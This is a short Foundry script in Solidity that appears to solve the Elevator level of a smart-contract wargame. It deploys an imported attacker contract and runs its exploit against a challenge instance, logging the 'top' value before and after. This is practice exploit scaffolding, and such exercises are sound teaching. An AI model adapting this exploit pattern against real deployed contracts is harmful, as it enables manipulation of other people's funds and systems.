// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/11_elevator.sol";
import "contracts/11_elevator.sol";

contract AttackerElevatorScript is Script {
    Elevator elevator = Elevator(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        AttackerElevator attackerElevator = new AttackerElevator();

        console.log("Current top :", elevator.top());
        attackerElevator.exploit(address(elevator));
        console.log("New top :", elevator.top());

        vm.stopBroadcast();
    }
}
